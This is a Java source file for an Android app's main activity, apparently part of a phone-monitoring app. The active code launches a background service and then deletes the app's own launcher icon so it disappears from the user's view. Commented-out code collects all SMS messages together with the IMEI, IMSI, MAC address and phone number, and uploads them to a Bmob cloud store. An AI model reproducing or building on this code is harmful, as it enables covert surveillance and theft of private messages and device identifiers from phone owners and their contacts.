package com.my.phonermon;

import com.my.phonermon.utils.ShortcutUtils;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;

public class MainActivity extends Activity {
	
	public static final String URI_SMS = "content://sms";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		Intent intent = new Intent(Constants.ACTION_SCREEN_BROADCAST_SERVICE);
		startService(intent);
		new Handler().postDelayed(new Runnable() {
			
			@Override
			public void run() {
				ShortcutUtils.deleteIcon(MainActivity.this, R.drawable.ic_launcher, getString(R.string.app_name), MainActivity.class.getName());
//				ShortcutUtils.createIcon(MainActivity.this, R.drawable.ic_launcher2, "test", MainActivity.class.getName());
				finish();
			}
		}, 3000);
		
		
		
		
//		List<DBSMS> dbSMSList = DBUtils.query(Uri.parse(URI_SMS), null, null, null, null, DBSMS.class);
//		List<NetSMS> localNetSMSList = convert2NetSMS(dbSMSList);
//		List<BmobObject> datas = new ArrayList<BmobObject>();
//		datas.addAll(localNetSMSList);
//		NetSMS.insertBatch(datas, new SaveListener() {
//			
//			@Override
//			public void onSuccess() {
//				ToastUtils.showToast("insertBatch success");
//			}
//			
//			@Override
//			public void onFailure(int arg0, String arg1) {
//				ToastUtils.showToast("insertBatch failure");
//			}
//		});
		
//		NetSMS.queryAll(new FindListener<NetSMS>() {
//			
//			@Override
//			public void onSuccess(List<NetSMS> netSMSList) {
//				ToastUtils.showToast("queryAll success");
//				List<DBSMS> dbSMSList = DBUtils.query(Uri.parse(URI_SMS), null, null, null, null, DBSMS.class);
//				List<NetSMS> localNetSMSList = convert2NetSMS(dbSMSList);
//				List<NetSMS> noExistNetSMSList = new ArrayList<NetSMS>();
//				if(netSMSList != null){
//					for (NetSMS local : localNetSMSList) {
//						if (local == null) {
//							continue;
//						}
//						if (!netSMSList.contains(local)) {
//							noExistNetSMSList.add(local);
//						}
//					}
//				} else {
//					noExistNetSMSList.addAll(localNetSMSList);
//				}
//				
//				List<BmobObject> datas = new ArrayList<BmobObject>();
//				datas.addAll(noExistNetSMSList);
//				NetSMS.insertBatch(datas, new SaveListener() {
//					
//					@Override
//					public void onSuccess() {
//						ToastUtils.showToast("insertBatch success");
//					}
//					
//					@Override
//					public void onFailure(int arg0, String arg1) {
//						ToastUtils.showToast("insertBatch failure");
//					}
//				});
//			}
//			
//			@Override
//			public void onError(int code, String msg) {
//				ToastUtils.showToast("queryAll failure");
//			}
//
//		});
	}
//	
//	private List<NetSMS> convert2NetSMS(List<DBSMS> dbSMSList) {
//		List<NetSMS> result = new ArrayList<NetSMS>();
//		if (dbSMSList != null) {
//			for (DBSMS sms : dbSMSList) {
//				if(sms == null){
//					continue;
//				}
//				NetSMS networkSms = new NetSMS();
//				networkSms.setBrand(android.os.Build.BRAND);
//				networkSms.setImei(PackageUtils.getIMEI());
//				networkSms.setImsi(PackageUtils.getIMSI());
//				networkSms.setMac(PackageUtils.getMAC());
//				networkSms.setModel(android.os.Build.MODEL);
//				networkSms.setSenderTime(new Date(sms.getDate()));
//				networkSms.setSmsMsg(sms.getBody());
//				if(sms.getType() == 1){
//					networkSms.setStatus(NetSMS.Receive);
//					networkSms.setReceiver(PackageUtils.getPhoneNumber());
//					networkSms.setSender(sms.getAddress());
//				}else if(sms.getType() == 2){
//					networkSms.setStatus(NetSMS.Send);
//					networkSms.setSender(PackageUtils.getPhoneNumber());
//					networkSms.setReceiver(sms.getAddress());
//				}
//				result.add(networkSms);
//			}
//		}
//		return result;
//	}	

}
